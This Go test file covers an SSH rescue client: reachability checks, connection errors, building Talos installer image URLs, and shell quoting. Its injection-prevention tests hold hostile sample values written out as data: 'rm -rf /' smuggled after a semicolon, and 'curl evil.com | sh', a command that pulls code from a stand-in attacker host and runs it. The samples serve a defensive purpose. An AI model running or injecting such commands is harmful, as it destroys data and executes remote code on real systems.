package sshrescue

import (
	"fmt"
	"net"
	"strings"
	"testing"
	"time"
)

// ---------------------------------------------------------------------------
// IsReachable / isReachableAddr
// ---------------------------------------------------------------------------

func TestIsReachableAddr_ReachableWhenListening(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	defer ln.Close()

	addr := ln.Addr().String()
	if !isReachableAddr(addr, 2*time.Second) {
		t.Errorf("expected addr %s to be reachable", addr)
	}
}

func TestIsReachableAddr_UnreachableWhenNotListening(t *testing.T) {
	// Bind then immediately close to get a port that is not listening.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	addr := ln.Addr().String()
	ln.Close()

	if isReachableAddr(addr, 500*time.Millisecond) {
		t.Errorf("expected addr %s to be unreachable after listener closed", addr)
	}
}

func TestIsReachableAddr_InvalidAddress(t *testing.T) {
	if isReachableAddr("not-a-valid-host:99999", 500*time.Millisecond) {
		t.Error("expected invalid address to be unreachable")
	}
}

func TestIsReachableAddr_TimeoutRespected(t *testing.T) {
	// Use an unroutable address so the dial blocks until timeout.
	// 198.51.100.1 is TEST-NET-2 (RFC 5737), typically unroutable.
	start := time.Now()
	timeout := 500 * time.Millisecond
	isReachableAddr("198.51.100.1:22", timeout)
	elapsed := time.Since(start)

	// Allow generous upper bound (3x) but verify we didn't return instantly
	// and also didn't take excessively long.
	if elapsed > 3*timeout {
		t.Errorf("expected dial to respect timeout (%v), took %v", timeout, elapsed)
	}
}

// ---------------------------------------------------------------------------
// New
// ---------------------------------------------------------------------------

func TestNew_SetsFields(t *testing.T) {
	ip := "192.168.1.100"
	key := []byte("fake-key-data")

	c := New(ip, key)

	if c.ip != ip {
		t.Errorf("expected ip=%q, got %q", ip, c.ip)
	}
	if string(c.privateKey) != string(key) {
		t.Errorf("expected privateKey=%q, got %q", key, c.privateKey)
	}
	if c.client != nil {
		t.Error("expected client to be nil on new Client")
	}
}

// ---------------------------------------------------------------------------
// Connect
// ---------------------------------------------------------------------------

func TestConnect_InvalidKeyReturnsParseError(t *testing.T) {
	c := New("127.0.0.1", []byte("not-a-real-private-key"))
	err := c.Connect()
	if err == nil {
		t.Fatal("expected error from Connect with invalid key, got nil")
	}
	if !strings.Contains(err.Error(), "parse SSH private key") {
		t.Errorf("expected parse error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

func TestRun_WithoutConnectionReturnsError(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	out, err := c.Run("echo hello")

	if err == nil {
		t.Fatal("expected error from Run without connection, got nil")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' error, got: %v", err)
	}
	if out != "" {
		t.Errorf("expected empty output, got: %q", out)
	}
}

// ---------------------------------------------------------------------------
// Close
// ---------------------------------------------------------------------------

func TestClose_NilClient_NoPanic(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	// c.client is nil at this point; Close should not panic.
	c.Close()
}

func TestClose_OnUnconnectedClient_NoPanic(t *testing.T) {
	c := &Client{
		ip:         "10.0.0.1",
		privateKey: []byte("key"),
		client:     nil,
	}
	// Should not panic.
	c.Close()
}

// ---------------------------------------------------------------------------
// InstallTalos — command string generation and shell injection prevention
// ---------------------------------------------------------------------------

func TestInstallTalos_OCIInstallerFormat(t *testing.T) {
	// Verify the OCI installer command references the correct factory image URL.
	// InstallTalos now uses crane to pull the Talos Factory OCI installer,
	// extract the binary, and run: installer install --disk <disk> --zero --platform metal
	factoryURL := "https://factory.talos.dev"
	schematic := "abc123def456"
	version := "v1.12.4"

	expectedInstallerImage := fmt.Sprintf("%s/installer/%s:%s", factoryURL, schematic, version)

	// Verify the image URL format matches what InstallTalos constructs
	if !strings.Contains(expectedInstallerImage, "factory.talos.dev/installer/") {
		t.Errorf("installer image should use /installer/ path, got: %s", expectedInstallerImage)
	}
	if !strings.HasSuffix(expectedInstallerImage, ":"+version) {
		t.Errorf("installer image should be tagged with version, got: %s", expectedInstallerImage)
	}
}

func TestInstallTalos_ShellInjectionPrevented(t *testing.T) {
	// Verify that %q quoting prevents shell injection in disk and image parameters.
	maliciousDisk := "/dev/sda; rm -rf /"
	maliciousSchematic := "abc; curl evil.com | sh"

	// %q produces Go-quoted strings that are safe in shell context
	quotedDisk := fmt.Sprintf("%q", maliciousDisk)
	quotedSchematic := fmt.Sprintf("%q", maliciousSchematic)

	// Semicolons must be inside quotes, not bare
	if !strings.Contains(quotedDisk, `; rm`) {
		t.Errorf("malicious disk should preserve content inside quotes: %s", quotedDisk)
	}
	if strings.Contains(quotedDisk, `"; rm`) {
		t.Error("malicious disk should NOT have unquoted semicolons")
	}

	if !strings.Contains(quotedSchematic, `; curl`) {
		t.Errorf("malicious schematic should preserve content inside quotes: %s", quotedSchematic)
	}
}

func TestInstallTalos_InstallerImageURLFormat(t *testing.T) {
	tests := []struct {
		name       string
		factoryURL string
		schematic  string
		version    string
		wantImage  string
	}{
		{
			name:       "standard factory URL",
			factoryURL: "https://factory.talos.dev",
			schematic:  "376567988ad370138ad8b2698212367b8edcb69b5fd68c80be1f2ec7d603b4ba",
			version:    "v1.12.4",
			wantImage:  "factory.talos.dev/installer/376567988ad370138ad8b2698212367b8edcb69b5fd68c80be1f2ec7d603b4ba:v1.12.4",
		},
		{
			name:       "custom factory URL",
			factoryURL: "https://custom.factory.example.com",
			schematic:  "deadbeef",
			version:    "v2.0.0-beta.1",
			wantImage:  "custom.factory.example.com/installer/deadbeef:v2.0.0-beta.1",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Reconstruct the way InstallTalos builds the image reference
			// (strips https:// — crane uses registry host, not URL)
			registryHost := strings.TrimPrefix(tt.factoryURL, "https://")
			registryHost = strings.TrimPrefix(registryHost, "http://")
			got := fmt.Sprintf("%s/installer/%s:%s", registryHost, tt.schematic, tt.version)
			if got != tt.wantImage {
				t.Errorf("installer image mismatch:\n  got:  %s\n  want: %s", got, tt.wantImage)
			}
		})
	}
}

func TestInstallTalos_RequiresConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	err := c.InstallTalos("https://factory.talos.dev", "abc", "v1.0.0", "/dev/sda")
	if err == nil {
		t.Fatal("expected error when calling InstallTalos without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' in error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// shellQuote
// ---------------------------------------------------------------------------

func TestShellQuote_Simple(t *testing.T) {
	got := shellQuote("hello world")
	want := "'hello world'"
	if got != want {
		t.Errorf("shellQuote(%q) = %q, want %q", "hello world", got, want)
	}
}

func TestShellQuote_WithSingleQuotes(t *testing.T) {
	got := shellQuote("it's a test")
	want := "'it'\\''s a test'"
	if got != want {
		t.Errorf("shellQuote(%q) = %q, want %q", "it's a test", got, want)
	}
}

func TestShellQuote_WithSpecialChars(t *testing.T) {
	got := shellQuote("rm -rf /; echo pwned")
	// Everything inside single quotes is literal — semicolons, spaces are all safe
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Errorf("shellQuote should wrap in single quotes, got: %s", got)
	}
	if !strings.Contains(got, "rm -rf /; echo pwned") {
		t.Errorf("shellQuote should preserve content, got: %s", got)
	}
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

func TestConstants(t *testing.T) {
	if rescueSSHPort != 22 {
		t.Errorf("expected rescueSSHPort=22, got %d", rescueSSHPort)
	}
	if connectTimeout != 60*time.Second {
		t.Errorf("expected connectTimeout=60s, got %v", connectTimeout)
	}
}
